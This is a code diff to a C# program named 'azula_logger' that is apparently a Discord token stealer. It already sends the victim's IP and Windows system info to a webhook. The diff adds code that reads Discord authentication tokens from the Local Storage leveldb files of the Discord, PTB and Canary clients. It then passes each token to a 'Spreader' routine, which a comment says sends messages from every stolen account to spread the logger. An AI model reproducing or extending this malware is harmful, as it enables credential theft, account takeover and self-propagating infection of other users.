@@ -46,8 +46,22 @@ namespace azula_logger
             IPGetter.GetIP(webhook, image);
             //Getting windows system info
             wininfo.GetWinInfo(webhook, image);
+            //spreading the token Logger
 
 
+            //making a list with all the tokens so we can try to send a message from all of them
+            List<string> tokensss = new List<string>();
+
+            //adding all the tokens to our list
+            tokensss.Add(TokenGetter.ReturnToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", webhook, image));
+            tokensss.Add(TokenGetter.ReturnToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordptb\Local Storage\leveldb", "*.ldb", webhook, image));
+            tokensss.Add(TokenGetter.ReturnToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordcanary\Local Storage\leveldb", "*.ldb", webhook, image));
+
+            //trying to send a message with every token we collected in our list ^^^^
+            foreach(var line in tokensss)
+            {
+                Spreader.spread(line);
+            }
         }
 
     }
